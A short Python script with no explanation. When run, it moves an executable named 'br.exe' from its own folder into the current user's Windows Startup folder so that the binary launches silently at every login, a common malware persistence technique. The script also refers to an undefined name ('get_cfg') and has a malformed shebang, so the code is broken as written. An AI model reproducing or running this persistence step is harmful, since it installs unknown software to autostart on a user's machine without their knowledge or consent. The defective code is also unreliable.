#!usr/bin/env python3
import subprocess
import os
import inspect
def mvFile():
	currentPath = os.path.dirname(inspect.getabsfile(get_cfg))
	file_path = os.path.join(currentPath, "br.exe")
	currentUser = os.getlogin()
	subprocess.call(f'move {file_path} C:\\Users\\{currentUser}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
mvFile()